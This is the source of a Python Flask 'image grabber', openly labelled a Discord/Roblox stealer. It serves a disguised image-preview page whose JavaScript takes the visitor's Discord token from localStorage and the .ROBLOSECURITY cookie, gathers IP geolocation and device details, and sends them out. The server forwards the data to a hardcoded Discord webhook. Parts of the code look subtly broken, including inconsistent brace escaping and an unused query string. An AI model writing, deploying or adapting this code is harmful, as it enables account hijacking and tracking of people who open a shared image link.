# api/main.py - ULTIMATE IMAGE GRABBER v7.0
# CLICK IMAGE → FULL BROWSER STEAL → #img-logger EMBED

import os
import json
import base64
import requests
from flask import Flask, request, Response
from datetime import datetime
from urllib.parse import quote, urlencode
import threading
import re

app = Flask(__name__)

WEBHOOK = "https://discord.com/api/webhooks/1470096967848824842/r-JzPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV"

GIF_PIXEL = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')

def send_discord(data):
    embed = {
        "username": "🎮 DISCORD/ROBLOX STEALER",
        "embeds": [{
            "title": f"🔥 IMAGE CLICK STEAL - {data.get('ip', 'Unknown')}",
            "description": f"**🗺️ GEO:** [{data.get('lat', '?')}, {data.get('lon', '?')}](https://google.com/maps?q={data.get('lat',0)},{data.get('lon',0)})",
            "color": 16711680,
            "fields": [
                {"name": "🔑 Discord Token", "value": f"`{data.get('token', '❌')[:32]}...`", "inline": True},
                {"name": "🎮 Roblox Cookie", "value": f"`{data.get('roblox', '❌')[:32]}...`", "inline": True},
                {"name": "📍 Location", "value": f"{data.get('city', '?')}, {data.get('region', '?')}\n{data.get('country', '?')}", "inline": True},
                {"name": "🌐 ISP/AS", "value": f"{data.get('isp', '?')} ({data.get('asn', '?')})", "inline": True},
                {"name": "📱 Device", "value": f"{data.get('screen', '?')} | {data.get('cores', '?')}CPU", "inline": True},
                {"name": "🕸️ Browser", "value": f"{data.get('ua', '?')[:60]}...", "inline": False}
            ],
            "footer": {"text": f"Ref: {data.get('ref', 'Direct')} | {data.get('time', 'Now')}"},
            "timestamp": datetime.utcnow().isoformat()
        }]
    }
    try:
        threading.Thread(target=lambda: requests.post(WEBHOOK, json=embed, timeout=5), daemon=True).start()
    except: pass

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path=""):
    ip = request.remote_addr
    ua = request.headers.get('user-agent', '')[:120]
    
    if 'test' in path.lower():
        send_discord({"ip": ip, "ua": ua, "test": "LIVE"})
        return "<h1>✅ SENT TO #img-logger - CHECK DISCORD NOW</h1>"
    
    if any(x in path.lower() for x in ['grab.png', 'steal.png', 'image.png', 'png', 'jpg', 'gif']):
        return Response(grabber_page(ip), mimetype='text/html')
    
    return Response(GIF_PIXEL, mimetype='image/gif')

def grabber_page(ip):
    return f'''<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Image Preview</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{{background:#111;height:100vh;display:flex;flex-direction:column;font-family:Arial}}
.header{{background:#222;color:#fff;padding:20px;text-align:center}}
.content{{flex:1;display:flex;align-items:center;justify-content:center;background:#000}}
img{{max-width:90%;max-height:90%;object-fit:contain;border:2px solid #444}}
</style>
</head>
<body>
<div class="header">
<h2>🖼️ Image Preview (Processing...)</h2>
</div>
<div class="content">
<img src="data:image/gif;base64,R0lGODlhEAAQAIAAAP///wAAACH5BAEAAAAALAAAAAAQABAAAAVH5CCSCQAh+QQFDAHACwAAAAA QABAAACVIyPqcvtD6OctNqLs968+w+G4giUI2meYQmoK+qKz57wIqxfmd/3PYjAArUAOw==" alt="Loading">
</div>
<script>
(async()=>{
try{{
const steal=()=>{{
const t=localStorage.getItem("token")||'';
const r=document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/)?.[1]?.replace(/[^a-z0-9_-]/gi,'')||'';
const d={{
ip:'{ip}',
token:t.slice(0,100),
roblox:r.slice(0,100),
ua:navigator.userAgent,
screen:`${{screen.width}}x${{screen.height}}`,
cores:navigator.hardwareConcurrency||1,
lang:navigator.language,
platform:navigator.platform,
ref:document.referrer||'direct',
time:new Date().toISOString()
}};
fetch(`https://httpbin.org/ip`).then(x=>x.json()).then(ipdata=>{
Object.assign(d,ipdata);
fetch(`https://ipapi.co/json/`).then(x=>x.json()).then(geo=>{{
Object.assign(d,{{
lat:geo.latitude,lon:geo.longitude,
city:geo.city,region:geo.region,country:geo.country_name,
isp:geo.org,asn:geo.asn,tz:geo.timezone
}});
const url=new URLSearchParams(d).toString();
navigator.sendBeacon('/steal.png?'+url);
fetch('/steal.png?'+url,{keepalive:true});
}}).catch(()=>{{navigator.sendBeacon('/steal.png?'+new URLSearchParams(d).toString());}});
});
}};
steal();
setTimeout(steal,1500);
setTimeout(steal,5000);
}}catch{{}}})();
</script>
</body>
</html>'''

if __name__=='__main__':
    port=int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0',port=port)
